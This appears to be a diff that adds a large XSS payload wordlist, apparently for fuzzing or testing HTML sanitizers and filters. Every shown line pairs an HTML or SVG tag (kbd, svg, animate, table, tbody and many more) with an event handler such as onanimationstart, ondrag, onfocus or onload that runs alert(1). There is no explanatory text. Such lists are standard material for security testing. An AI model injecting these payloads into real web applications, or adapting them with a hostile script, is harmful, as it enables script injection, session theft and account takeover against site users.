+<style>@keyframes x{}</style><isindex style="animation-name:x" onanimationstart="alert(1)"></isindex>
+<style>@keyframes x{}</style><kbd style="animation-name:x" onanimationend="alert(1)"></kbd>
+<style>@keyframes x{}</style><kbd style="animation-name:x" onanimationstart="alert(1)"></kbd>
+<style>@keyframes x{}</style><keygen style="animation-name:x" onanimationend="alert(1)"></keygen>
+<style>@keyframes x{}</style><keygen style="animation-name:x" onanimationstart="alert(1)"></keygen>
+<style>@keyframes x{}</style><label style="animation-name:x" onanimationend="alert(1)"></label>
+<style>@keyframes x{}</style><label style="animation-name:x" onanimationstart="alert(1)"></label>
+<style>@keyframes x{}</style><legend style="animation-name:x" onanimationend="alert(1)"></legend>
+<style>@keyframes x{}</style><legend style="animation-name:x" onanimationstart="alert(1)"></legend>
+<style>@keyframes x{}</style><li style="animation-name:x" onanimationend="alert(1)"></li>
+<style>@keyframes x{}</style><li style="animation-name:x" onanimationstart="alert(1)"></li>
+<style>@keyframes x{}</style><link style="animation-name:x" onanimationend="alert(1)"></link>
+<style>@keyframes x{}</style><link style="animation-name:x" onanimationstart="alert(1)"></link>
+<style>@keyframes x{}</style><listing style="animation-name:x" onanimationend="alert(1)"></listing>
+<style>@keyframes x{}</style><listing style="animation-name:x" onanimationstart="alert(1)"></listing>
+<style>@keyframes x{}</style><main style="animation-name:x" onanimationend="alert(1)"></main>
+<style>@keyframes x{}</style><main style="animation-name:x" onanimationstart="alert(1)"></main>
+<style>@keyframes x{}</style><map style="animation-name:x" onanimationend="alert(1)"></map>
+<style>@keyframes x{}</style><map style="animation-name:x" onanimationstart="alert(1)"></map>
+<style>@keyframes x{}</style><mark style="animation-name:x" onanimationend="alert(1)"></mark>
+<style>@keyframes x{}</style><mark style="animation-name:x" onanimationstart="alert(1)"></mark>
+<style>@keyframes x{}</style><marquee style="animation-name:x" onanimationend="alert(1)"></marquee>
+<style>@keyframes x{}</style><marquee style="animation-name:x" onanimationstart="alert(1)"></marquee>
+<style>@keyframes x{}</style><menu style="animation-name:x" onanimationend="alert(1)"></menu>
+<style>@keyframes x{}</style><menu style="animation-name:x" onanimationstart="alert(1)"></menu>
+<style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationend="alert(1)"></menuitem>
+<style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationstart="alert(1)"></menuitem>
+<style>@keyframes x{}</style><meta style="animation-name:x" onanimationend="alert(1)"></meta>
+<style>@keyframes x{}</style><meta style="animation-name:x" onanimationstart="alert(1)"></meta>
+<style>@keyframes x{}</style><meter style="animation-name:x" onanimationend="alert(1)"></meter>
+<style>@keyframes x{}</style><meter style="animation-name:x" onanimationstart="alert(1)"></meter>
+<style>@keyframes x{}</style><multicol style="animation-name:x" onanimationend="alert(1)"></multicol>
+<style>@keyframes x{}</style><multicol style="animation-name:x" onanimationstart="alert(1)"></multicol>
+<style>@keyframes x{}</style><nav style="animation-name:x" onanimationend="alert(1)"></nav>
+<style>@keyframes x{}</style><nav style="animation-name:x" onanimationstart="alert(1)"></nav>
+<style>@keyframes x{}</style><nextid style="animation-name:x" onanimationend="alert(1)"></nextid>
+<style>@keyframes x{}</style><nextid style="animation-name:x" onanimationstart="alert(1)"></nextid>
+<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationend="alert(1)"></nobr>
+<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationstart="alert(1)"></nobr>
+<style>@keyframes x{}</style><noembed style="animation-name:x" onanimationend="alert(1)"></noembed>
+<style>@keyframes x{}</style><noembed style="animation-name:x" onanimationstart="alert(1)"></noembed>
+<style>@keyframes x{}</style><noframes style="animation-name:x" onanimationend="alert(1)"></noframes>
+<style>@keyframes x{}</style><noframes style="animation-name:x" onanimationstart="alert(1)"></noframes>
+<style>@keyframes x{}</style><noscript style="animation-name:x" onanimationend="alert(1)"></noscript>
+<style>@keyframes x{}</style><noscript style="animation-name:x" onanimationstart="alert(1)"></noscript>
+<style>@keyframes x{}</style><object style="animation-name:x" onanimationend="alert(1)"></object>
+<style>@keyframes x{}</style><object style="animation-name:x" onanimationstart="alert(1)"></object>
+<style>@keyframes x{}</style><ol style="animation-name:x" onanimationend="alert(1)"></ol>
+<style>@keyframes x{}</style><ol style="animation-name:x" onanimationstart="alert(1)"></ol>
+<style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationend="alert(1)"></optgroup>
+<style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationstart="alert(1)"></optgroup>
+<style>@keyframes x{}</style><option style="animation-name:x" onanimationend="alert(1)"></option>
+<style>@keyframes x{}</style><option style="animation-name:x" onanimationstart="alert(1)"></option>
+<style>@keyframes x{}</style><output style="animation-name:x" onanimationend="alert(1)"></output>
+<style>@keyframes x{}</style><output style="animation-name:x" onanimationstart="alert(1)"></output>
+<style>@keyframes x{}</style><p style="animation-name:x" onanimationend="alert(1)"></p>
+<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="alert(1)"></p>
+<style>@keyframes x{}</style><param style="animation-name:x" onanimationend="alert(1)"></param>
+<style>@keyframes x{}</style><param style="animation-name:x" onanimationstart="alert(1)"></param>
+<style>@keyframes x{}</style><picture style="animation-name:x" onanimationend="alert(1)"></picture>
+<style>@keyframes x{}</style><picture style="animation-name:x" onanimationstart="alert(1)"></picture>
+<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationend="alert(1)"></plaintext>
+<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationstart="alert(1)"></plaintext>
+<style>@keyframes x{}</style><pre style="animation-name:x" onanimationend="alert(1)"></pre>
+<style>@keyframes x{}</style><pre style="animation-name:x" onanimationstart="alert(1)"></pre>
+<style>@keyframes x{}</style><progress style="animation-name:x" onanimationend="alert(1)"></progress>
+<style>@keyframes x{}</style><progress style="animation-name:x" onanimationstart="alert(1)"></progress>
+<style>@keyframes x{}</style><q style="animation-name:x" onanimationend="alert(1)"></q>
+<style>@keyframes x{}</style><q style="animation-name:x" onanimationstart="alert(1)"></q>
+<style>@keyframes x{}</style><rb style="animation-name:x" onanimationend="alert(1)"></rb>
+<style>@keyframes x{}</style><rb style="animation-name:x" onanimationstart="alert(1)"></rb>
+<style>@keyframes x{}</style><rp style="animation-name:x" onanimationend="alert(1)"></rp>
+<style>@keyframes x{}</style><rp style="animation-name:x" onanimationstart="alert(1)"></rp>
+<style>@keyframes x{}</style><rt style="animation-name:x" onanimationend="alert(1)"></rt>
+<style>@keyframes x{}</style><rt style="animation-name:x" onanimationstart="alert(1)"></rt>
+<style>@keyframes x{}</style><rtc style="animation-name:x" onanimationend="alert(1)"></rtc>
+<style>@keyframes x{}</style><rtc style="animation-name:x" onanimationstart="alert(1)"></rtc>
+<style>@keyframes x{}</style><ruby style="animation-name:x" onanimationend="alert(1)"></ruby>
+<style>@keyframes x{}</style><ruby style="animation-name:x" onanimationstart="alert(1)"></ruby>
+<style>@keyframes x{}</style><s style="animation-name:x" onanimationend="alert(1)"></s>
+<style>@keyframes x{}</style><s style="animation-name:x" onanimationstart="alert(1)"></s>
+<style>@keyframes x{}</style><samp style="animation-name:x" onanimationend="alert(1)"></samp>
+<style>@keyframes x{}</style><samp style="animation-name:x" onanimationstart="alert(1)"></samp>
+<style>@keyframes x{}</style><script style="animation-name:x" onanimationend="alert(1)"></script>
+<style>@keyframes x{}</style><script style="animation-name:x" onanimationstart="alert(1)"></script>
+<style>@keyframes x{}</style><section style="animation-name:x" onanimationend="alert(1)"></section>
+<style>@keyframes x{}</style><section style="animation-name:x" onanimationstart="alert(1)"></section>
+<style>@keyframes x{}</style><select style="animation-name:x" onanimationend="alert(1)"></select>
+<style>@keyframes x{}</style><select style="animation-name:x" onanimationstart="alert(1)"></select>
+<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationend="alert(1)"></shadow>
+<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationstart="alert(1)"></shadow>
+<style>@keyframes x{}</style><slot style="animation-name:x" onanimationend="alert(1)"></slot>
+<style>@keyframes x{}</style><slot style="animation-name:x" onanimationstart="alert(1)"></slot>
+<style>@keyframes x{}</style><small style="animation-name:x" onanimationend="alert(1)"></small>
+<style>@keyframes x{}</style><small style="animation-name:x" onanimationstart="alert(1)"></small>
+<style>@keyframes x{}</style><source style="animation-name:x" onanimationend="alert(1)"></source>
+<style>@keyframes x{}</style><source style="animation-name:x" onanimationstart="alert(1)"></source>
+<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationend="alert(1)"></spacer>
+<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationstart="alert(1)"></spacer>
+<style>@keyframes x{}</style><span style="animation-name:x" onanimationend="alert(1)"></span>
+<style>@keyframes x{}</style><span style="animation-name:x" onanimationstart="alert(1)"></span>
+<style>@keyframes x{}</style><strike style="animation-name:x" onanimationend="alert(1)"></strike>
+<style>@keyframes x{}</style><strike style="animation-name:x" onanimationstart="alert(1)"></strike>
+<style>@keyframes x{}</style><strong style="animation-name:x" onanimationend="alert(1)"></strong>
+<style>@keyframes x{}</style><strong style="animation-name:x" onanimationstart="alert(1)"></strong>
+<style>@keyframes x{}</style><style style="animation-name:x" onanimationend="alert(1)"></style>
+<style>@keyframes x{}</style><style style="animation-name:x" onanimationstart="alert(1)"></style>
+<style>@keyframes x{}</style><sub style="animation-name:x" onanimationend="alert(1)"></sub>
+<style>@keyframes x{}</style><sub style="animation-name:x" onanimationstart="alert(1)"></sub>
+<style>@keyframes x{}</style><summary style="animation-name:x" onanimationend="alert(1)"></summary>
+<style>@keyframes x{}</style><summary style="animation-name:x" onanimationstart="alert(1)"></summary>
+<style>@keyframes x{}</style><sup style="animation-name:x" onanimationend="alert(1)"></sup>
+<style>@keyframes x{}</style><sup style="animation-name:x" onanimationstart="alert(1)"></sup>
+<style>@keyframes x{}</style><svg style="animation-name:x" onanimationend="alert(1)"></svg>
+<style>@keyframes x{}</style><svg style="animation-name:x" onanimationstart="alert(1)"></svg>
+<style>@keyframes x{}</style><table style="animation-name:x" onanimationend="alert(1)"></table>
+<style>@keyframes x{}</style><table style="animation-name:x" onanimationstart="alert(1)"></table>
+<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationend="alert(1)"></tbody>
+<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationstart="alert(1)"></tbody>
+<style>@keyframes x{}</style><td style="animation-name:x" onanimationend="alert(1)"></td>
+<style>@keyframes x{}</style><td style="animation-name:x" onanimationstart="alert(1)"></td>
+<style>@keyframes x{}</style><template style="animation-name:x" onanimationend="alert(1)"></template>
+<style>@keyframes x{}</style><template style="animation-name:x" onanimationstart="alert(1)"></template>
+<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationend="alert(1)"></textarea>
+<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationstart="alert(1)"></textarea>
+<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationend="alert(1)"></tfoot>
+<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationstart="alert(1)"></tfoot>
+<style>@keyframes x{}</style><th style="animation-name:x" onanimationend="alert(1)"></th>
+<style>@keyframes x{}</style><th style="animation-name:x" onanimationstart="alert(1)"></th>
+<style>@keyframes x{}</style><thead style="animation-name:x" onanimationend="alert(1)"></thead>
+<style>@keyframes x{}</style><thead style="animation-name:x" onanimationstart="alert(1)"></thead>
+<style>@keyframes x{}</style><time style="animation-name:x" onanimationend="alert(1)"></time>
+<style>@keyframes x{}</style><time style="animation-name:x" onanimationstart="alert(1)"></time>
+<style>@keyframes x{}</style><title style="animation-name:x" onanimationend="alert(1)"></title>
+<style>@keyframes x{}</style><title style="animation-name:x" onanimationstart="alert(1)"></title>
+<style>@keyframes x{}</style><tr style="animation-name:x" onanimationend="alert(1)"></tr>
+<style>@keyframes x{}</style><tr style="animation-name:x" onanimationstart="alert(1)"></tr>
+<style>@keyframes x{}</style><track style="animation-name:x" onanimationend="alert(1)"></track>
+<style>@keyframes x{}</style><track style="animation-name:x" onanimationstart="alert(1)"></track>
+<style>@keyframes x{}</style><tt style="animation-name:x" onanimationend="alert(1)"></tt>
+<style>@keyframes x{}</style><tt style="animation-name:x" onanimationstart="alert(1)"></tt>
+<style>@keyframes x{}</style><u style="animation-name:x" onanimationend="alert(1)"></u>
+<style>@keyframes x{}</style><u style="animation-name:x" onanimationstart="alert(1)"></u>
+<style>@keyframes x{}</style><ul style="animation-name:x" onanimationend="alert(1)"></ul>
+<style>@keyframes x{}</style><ul style="animation-name:x" onanimationstart="alert(1)"></ul>
+<style>@keyframes x{}</style><var style="animation-name:x" onanimationend="alert(1)"></var>
+<style>@keyframes x{}</style><var style="animation-name:x" onanimationstart="alert(1)"></var>
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="alert(1)"></video>
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationstart="alert(1)"></video>
+<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationend="alert(1)"></wbr>
+<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationstart="alert(1)"></wbr>
+<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationend="alert(1)"></xmp>
+<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationstart="alert(1)"></xmp>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+<sub draggable="true" ondrag="alert(1)">test</sub>
+<sub draggable="true" ondragend="alert(1)">test</sub>
+<sub draggable="true" ondragenter="alert(1)">test</sub>
+<sub draggable="true" ondragleave="alert(1)">test</sub>
+<sub draggable="true" ondragstart="alert(1)">test</sub>
+<sub id=x tabindex=1 onactivate=alert(1)></sub>
+<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>
+<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>
+<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>
+<sub id=x tabindex=1 onfocus=alert(1)></sub>
+<sub id=x tabindex=1 onfocusin=alert(1)></sub>
+<sub onbeforecopy="alert(1)" contenteditable>test</sub>
+<sub onbeforecut="alert(1)" contenteditable>test</sub>
+<sub onbeforepaste="alert(1)" contenteditable>test</sub>
+<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>
+<sub onclick="alert(1)">test</sub>
+<sub oncontextmenu="alert(1)">test</sub>
+<sub oncopy="alert(1)" contenteditable>test</sub>
+<sub oncut="alert(1)" contenteditable>test</sub>
+<sub ondblclick="alert(1)">test</sub>
+<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>
+<sub onkeydown="alert(1)" contenteditable>test</sub>
+<sub onkeypress="alert(1)" contenteditable>test</sub>
+<sub onkeyup="alert(1)" contenteditable>test</sub>
+<sub onmousedown="alert(1)">test</sub>
+<sub onmouseenter="alert(1)">test</sub>
+<sub onmouseleave="alert(1)">test</sub>
+<sub onmousemove="alert(1)">test</sub>
+<sub onmouseout="alert(1)">test</sub>
+<sub onmouseover="alert(1)">test</sub>
+<sub onmouseup="alert(1)">test</sub>
+<sub onpaste="alert(1)" contenteditable>test</sub>
+<summary draggable="true" ondrag="alert(1)">test</summary>
+<summary draggable="true" ondragend="alert(1)">test</summary>
+<summary draggable="true" ondragenter="alert(1)">test</summary>
+<summary draggable="true" ondragleave="alert(1)">test</summary>
+<summary draggable="true" ondragstart="alert(1)">test</summary>
+<summary id=x tabindex=1 onactivate=alert(1)></summary>
+<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>
+<summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>
+<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>
+<summary id=x tabindex=1 onfocus=alert(1)></summary>
+<summary id=x tabindex=1 onfocusin=alert(1)></summary>
+<summary onbeforecopy="alert(1)" contenteditable>test</summary>
+<summary onbeforecut="alert(1)" contenteditable>test</summary>
+<summary onbeforepaste="alert(1)" contenteditable>test</summary>
+<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>
+<summary onclick="alert(1)">test</summary>
+<summary oncontextmenu="alert(1)">test</summary>
+<summary oncopy="alert(1)" contenteditable>test</summary>
+<summary oncut="alert(1)" contenteditable>test</summary>
+<summary ondblclick="alert(1)">test</summary>
+<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>
+<summary onkeydown="alert(1)" contenteditable>test</summary>
+<summary onkeypress="alert(1)" contenteditable>test</summary>
+<summary onkeyup="alert(1)" contenteditable>test</summary>
+<summary onmousedown="alert(1)">test</summary>
+<summary onmouseenter="alert(1)">test</summary>
+<summary onmouseleave="alert(1)">test</summary>
+<summary onmousemove="alert(1)">test</summary>
+<summary onmouseout="alert(1)">test</summary>
+<summary onmouseover="alert(1)">test</summary>
+<summary onmouseup="alert(1)">test</summary>
+<summary onpaste="alert(1)" contenteditable>test</summary>
+<sup draggable="true" ondrag="alert(1)">test</sup>
+<sup draggable="true" ondragend="alert(1)">test</sup>
+<sup draggable="true" ondragenter="alert(1)">test</sup>
+<sup draggable="true" ondragleave="alert(1)">test</sup>
+<sup draggable="true" ondragstart="alert(1)">test</sup>
+<sup id=x tabindex=1 onactivate=alert(1)></sup>
+<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>
+<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>
+<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>
+<sup id=x tabindex=1 onfocus=alert(1)></sup>
+<sup id=x tabindex=1 onfocusin=alert(1)></sup>
+<sup onbeforecopy="alert(1)" contenteditable>test</sup>
+<sup onbeforecut="alert(1)" contenteditable>test</sup>
+<sup onbeforepaste="alert(1)" contenteditable>test</sup>
+<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>
+<sup onclick="alert(1)">test</sup>
+<sup oncontextmenu="alert(1)">test</sup>
+<sup oncopy="alert(1)" contenteditable>test</sup>
+<sup oncut="alert(1)" contenteditable>test</sup>
+<sup ondblclick="alert(1)">test</sup>
+<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>
+<sup onkeydown="alert(1)" contenteditable>test</sup>
+<sup onkeypress="alert(1)" contenteditable>test</sup>
+<sup onkeyup="alert(1)" contenteditable>test</sup>
+<sup onmousedown="alert(1)">test</sup>
+<sup onmouseenter="alert(1)">test</sup>
+<sup onmouseleave="alert(1)">test</sup>
+<sup onmousemove="alert(1)">test</sup>
+<sup onmouseout="alert(1)">test</sup>
+<sup onmouseover="alert(1)">test</sup>
+<sup onmouseup="alert(1)">test</sup>
+<sup onpaste="alert(1)" contenteditable>test</sup>
+<svg draggable="true" ondrag="alert(1)">test</svg>
+<svg draggable="true" ondragend="alert(1)">test</svg>
+<svg draggable="true" ondragenter="alert(1)">test</svg>
+<svg draggable="true" ondragleave="alert(1)">test</svg>
+<svg draggable="true" ondragstart="alert(1)">test</svg>
+<svg id=x onfocus=alert(1)>
+<svg id=x onfocusin=alert(1)>
+<svg id=x tabindex=1 onactivate=alert(1)></svg>
+<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>
+<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>
+<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>
+<svg onbeforecopy="alert(1)" contenteditable>test</svg>
+<svg onbeforecut="alert(1)" contenteditable>test</svg>
+<svg onbeforepaste="alert(1)" contenteditable>test</svg>
+<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg onclick="alert(1)">test</svg>
+<svg oncontextmenu="alert(1)">test</svg>
+<svg oncopy="alert(1)" contenteditable>test</svg>
+<svg oncut="alert(1)" contenteditable>test</svg>
+<svg ondblclick="alert(1)">test</svg>
+<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg onkeydown="alert(1)" contenteditable>test</svg>
+<svg onkeypress="alert(1)" contenteditable>test</svg>
+<svg onkeyup="alert(1)" contenteditable>test</svg>
+<svg onload=alert(1)>
+<svg onmousedown="alert(1)">test</svg>
+<svg onmouseenter="alert(1)">test</svg>
+<svg onmouseleave="alert(1)">test</svg>
+<svg onmousemove="alert(1)">test</svg>
+<svg onmouseout="alert(1)">test</svg>
+<svg onmouseover="alert(1)">test</svg>
+<svg onmouseup="alert(1)">test</svg>
+<svg onpaste="alert(1)" contenteditable>test</svg>
+<svg onunload=window.open('javascript:alert(1)')>
+<svg><a onload=alert(1)></a>
+<svg><abbr onload=alert(1)></abbr>
+<svg><acronym onload=alert(1)></acronym>
+<svg><address onload=alert(1)></address>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
+<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>
+<svg><applet onload=alert(1)></applet>
+<svg><area onload=alert(1)></area>
+<svg><article onload=alert(1)></article>
+<svg><aside onload=alert(1)></aside>
+<svg><audio onload=alert(1)></audio>
+<svg><b onload=alert(1)></b>
+<svg><base onload=alert(1)></base>
+<svg><basefont onload=alert(1)></basefont>
+<svg><bdi onload=alert(1)></bdi>
+<svg><bdo onload=alert(1)></bdo>
+<svg><bgsound onload=alert(1)></bgsound>
+<svg><big onload=alert(1)></big>
+<svg><blink onload=alert(1)></blink>
+<svg><blockquote onload=alert(1)></blockquote>
+<svg><br onload=alert(1)></br>
+<svg><button onload=alert(1)></button>
+<svg><canvas onload=alert(1)></canvas>
+<svg><caption onload=alert(1)></caption>
+<svg><center onload=alert(1)></center>
+<svg><cite onload=alert(1)></cite>
+<svg><code onload=alert(1)></code>
+<svg><col onload=alert(1)></col>
+<svg><colgroup onload=alert(1)></colgroup>
+<svg><command onload=alert(1)></command>
+<svg><content onload=alert(1)></content>
+<svg><data onload=alert(1)></data>
+<svg><datalist onload=alert(1)></datalist>
+<svg><dd onload=alert(1)></dd>
+<svg><del onload=alert(1)></del>
+<svg><details onload=alert(1)></details>
+<svg><dfn onload=alert(1)></dfn>
+<svg><dialog onload=alert(1)></dialog>
+<svg><dir onload=alert(1)></dir>
+<svg><discard onbegin=alert(1)>
+<svg><div onload=alert(1)></div>
+<svg><dl onload=alert(1)></dl>
+<svg><dt onload=alert(1)></dt>
+<svg><element onload=alert(1)></element>
+<svg><em onload=alert(1)></em>
+<svg><fieldset onload=alert(1)></fieldset>
+<svg><figcaption onload=alert(1)></figcaption>
+<svg><figure onload=alert(1)></figure>
+<svg><font onload=alert(1)></font>
+<svg><footer onload=alert(1)></footer>
+<svg><form onload=alert(1)></form>
+<svg><frameset onload=alert(1)></frameset>
+<svg><h1 onload=alert(1)></h1>
+<svg><head onload=alert(1)></head>
+<svg><header onload=alert(1)></header>
+<svg><hgroup onload=alert(1)></hgroup>
+<svg><hr onload=alert(1)></hr>
+<svg><html onload=alert(1)></html>
+<svg><i onload=alert(1)></i>
+<svg><image href=1 onerror=alert(1)>
+<svg><image href=validimage.png onload=alert(1)>
+<svg><ins onload=alert(1)></ins>
+<svg><kbd onload=alert(1)></kbd>
+<svg><keygen onload=alert(1)></keygen>
+<svg><label onload=alert(1)></label>
+<svg><legend onload=alert(1)></legend>
+<svg><li onload=alert(1)></li>
+<svg><listing onload=alert(1)></listing>
+<svg><main onload=alert(1)></main>
+<svg><map onload=alert(1)></map>
+<svg><mark onload=alert(1)></mark>
+<svg><marquee onload=alert(1)></marquee>
+<svg><menu onload=alert(1)></menu>
+<svg><menuitem onload=alert(1)></menuitem>
+<svg><meta onload=alert(1)></meta>
+<svg><meter onload=alert(1)></meter>
+<svg><multicol onload=alert(1)></multicol>
+<svg><nav onload=alert(1)></nav>
+<svg><nextid onload=alert(1)></nextid>
+<svg><nobr onload=alert(1)></nobr>
+<svg><noembed onload=alert(1)></noembed>
+<svg><noframes onload=alert(1)></noframes>
+<svg><noscript onload=alert(1)></noscript>
+<svg><ol onload=alert(1)></ol>
+<svg><optgroup onload=alert(1)></optgroup>
+<svg><option onload=alert(1)></option>
+<svg><output onload=alert(1)></output>
+<svg><p onload=alert(1)></p>
+<svg><param onload=alert(1)></param>
+<svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
+<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>
+<svg><path><animateMotion onrepeat=alert(1) dur="1s" repeatCount="2">
+<svg><picture onload=alert(1)></picture>
+<svg><plaintext onload=alert(1)></plaintext>
+<svg><pre onload=alert(1)></pre>
+<svg><progress onload=alert(1)></progress>
+<svg><q onload=alert(1)></q>
+<svg><rb onload=alert(1)></rb>
+<svg><rp onload=alert(1)></rp>
+<svg><rt onload=alert(1)></rt>
+<svg><rtc onload=alert(1)></rtc>
+<svg><ruby onload=alert(1)></ruby>
+<svg><s onload=alert(1)></s>
+<svg><samp onload=alert(1)></samp>
+<svg><section onload=alert(1)></section>
+<svg><select onload=alert(1)></select>
+<svg><set onbegin=alert(1) attributename=x dur=1s>
+<svg><set onend=alert(1) attributename=x dur=1s>
+<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
+<svg><shadow onload=alert(1)></shadow>
+<svg><slot onload=alert(1)></slot>
+<svg><small onload=alert(1)></small>
+<svg><source onload=alert(1)></source>
+<svg><spacer onload=alert(1)></spacer>
+<svg><span onload=alert(1)></span>
+<svg><strike onload=alert(1)></strike>
+<svg><strong onload=alert(1)></strong>
+<svg><sub onload=alert(1)></sub>
+<svg><summary onload=alert(1)></summary>
+<svg><sup onload=alert(1)></sup>
+<svg><table onload=alert(1)></table>
+<svg><tbody onload=alert(1)></tbody>
+<svg><td onload=alert(1)></td>
+<svg><template onload=alert(1)></template>
+<svg><textarea onload=alert(1)></textarea>
+<svg><tfoot onload=alert(1)></tfoot>
+<svg><th onload=alert(1)></th>
+<svg><thead onload=alert(1)></thead>
+<svg><time onload=alert(1)></time>
+<svg><title onload=alert(1)></title>
+<svg><tr onload=alert(1)></tr>
+<svg><tt onload=alert(1)></tt>
+<svg><u onload=alert(1)></u>
+<svg><ul onload=alert(1)></ul>
+<svg><var onload=alert(1)></var>
+<svg><video onload=alert(1)></video>
+<svg><wbr onload=alert(1)></wbr>
+<svg><xmp onload=alert(1)></xmp>
+<svg><xss onload=alert(1)></xss>
+<table draggable="true" ondrag="alert(1)">test</table>
+<table draggable="true" ondragend="alert(1)">test</table>
+<table draggable="true" ondragenter="alert(1)">test</table>
+<table draggable="true" ondragleave="alert(1)">test</table>
+<table draggable="true" ondragstart="alert(1)">test</table>
+<table id=x tabindex=1 onactivate=alert(1)></table>
+<table id=x tabindex=1 onbeforeactivate=alert(1)></table>
+<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>
+<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>
+<table id=x tabindex=1 onfocus=alert(1)></table>
+<table id=x tabindex=1 onfocusin=alert(1)></table>
+<table onbeforecopy="alert(1)" contenteditable>test</table>
+<table onbeforecut="alert(1)" contenteditable>test</table>
+<table onbeforepaste="alert(1)" contenteditable>test</table>
+<table onblur=alert(1) tabindex=1 id=x></table><input autofocus>
+<table onclick="alert(1)">test</table>
+<table oncontextmenu="alert(1)">test</table>
+<table oncopy="alert(1)" contenteditable>test</table>
+<table oncut="alert(1)" contenteditable>test</table>
+<table ondblclick="alert(1)">test</table>
+<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>
+<table onkeydown="alert(1)" contenteditable>test</table>
+<table onkeypress="alert(1)" contenteditable>test</table>
+<table onkeyup="alert(1)" contenteditable>test</table>
+<table onmousedown="alert(1)">test</table>
+<table onmouseenter="alert(1)">test</table>
+<table onmouseleave="alert(1)">test</table>
+<table onmousemove="alert(1)">test</table>
+<table onmouseout="alert(1)">test</table>
+<table onmouseover="alert(1)">test</table>
+<table onmouseup="alert(1)">test</table>
+<table onpaste="alert(1)" contenteditable>test</table>
+<tbody draggable="true" ondrag="alert(1)">test</tbody>
+<tbody draggable="true" ondragend="alert(1)">test</tbody>
+<tbody draggable="true" ondragenter="alert(1)">test</tbody>
+<tbody draggable="true" ondragleave="alert(1)">test</tbody>
+<tbody draggable="true" ondragstart="alert(1)">test</tbody>
+<tbody id=x tabindex=1 onactivate=alert(1)></tbody>
+<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>
+<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>
+<tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>
+<tbody id=x tabindex=1 onfocus=alert(1)></tbody>
+<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>
+<tbody onbeforecopy="alert(1)" contenteditable>test</tbody>
+<tbody onbeforecut="alert(1)" contenteditable>test</tbody>
+<tbody onbeforepaste="alert(1)" contenteditable>test</tbody>
+<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>
+<tbody onclick="alert(1)">test</tbody>
+<tbody oncontextmenu="alert(1)">test</tbody>
+<tbody oncopy="alert(1)" contenteditable>test</tbody>
+<tbody oncut="alert(1)" contenteditable>test</tbody>
+<tbody ondblclick="alert(1)">test</tbody>
+<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>
+<tbody onkeydown="alert(1)" contenteditable>test</tbody>
+<tbody onkeypress="alert(1)" contenteditable>test</tbody>
+<tbody onkeyup="alert(1)" contenteditable>test</tbody>
+<tbody onmousedown="alert(1)">test</tbody>
+<tbody onmouseenter="alert(1)">test</tbody>
+<tbody onmouseleave="alert(1)">test</tbody>
+<tbody onmousemove="alert(1)">test</tbody>
+<tbody onmouseout="alert(1)">test</tbody>
